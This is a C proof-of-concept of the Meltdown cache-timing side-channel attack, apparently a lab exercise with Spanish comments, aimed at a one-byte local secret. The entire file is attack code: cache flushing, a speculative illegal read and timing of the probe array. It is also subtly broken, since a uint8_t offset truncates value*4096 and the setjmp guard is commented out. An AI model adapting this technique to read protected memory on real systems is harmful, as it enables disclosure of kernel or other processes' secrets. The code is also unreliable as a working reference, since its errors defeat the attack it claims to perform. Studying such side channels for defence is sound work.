#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD 900
#define NUM_TRIALS 500
static jmp_buf env;
uint8_t leaked_value = 0;

static void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  longjmp(env, 1);
}

void meltdown_attack(uint8_t *address, uint8_t *probe_array) {
    int i; 
    //Flush probe_array from cache
    for (i= 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }
    _mm_mfence(); // Memory fence to enforce ordering
    // Try to read secret
    //if (setjmp(env) == 0) { // Save execution context
        uint8_t value = *address; // Illegal access ( causes fault )
        uint8_t offset = value * 4096; // Multiply value by 4096
        volatile uint8_t temp = probe_array[offset];  // Access based on value
    //}
    // After fault , recover which page is cached
    for (i = 0; i < 256; i++) {
        unsigned int aux;
        uint64_t t1 = __rdtscp(&aux);
        volatile uint8_t dummy = probe_array[i * 4096];
        uint64_t t2 = __rdtscp(&aux) - t1;
        if (t2 < CACHE_HIT_THRESHOLD && i>=1) {
            leaked_value = (uint8_t)i;
            return;
        }
    }
}

int main() {

    //tabla con resultados del ataque
    uint8_t results[256]={0};
    uint8_t secret[1]="H";

    // Probe array inicializado a 0
    uint8_t probe_array[256 * 4096];
    //Controla la señal sigsev con la funcion segfault_handler
    signal(SIGSEGV, segfault_handler);

    // Ejecutar el ataque
    int i;
    for (i = 0; i < NUM_TRIALS; i++) {
        meltdown_attack(secret, probe_array);
        results[leaked_value]++;
    }

    // Buscar el byte más repetido
    int max_count = 0;
    uint8_t max_val = 0;
    for (int i = 0; i < 255; i++) {
        printf("i:%c count:%d\n",i,results[i]);
        if (results[i] > max_count) {
            max_count = results[i];
            max_val = i;
        }
    }
    //printf("%i \n",max_val);

    // Restaurar permisos para liberar memoria limpia
    // mprotect(secret, pagesize, PROT_READ | PROT_WRITE);
    // munmap(secret, pagesize);

    return 0;
}
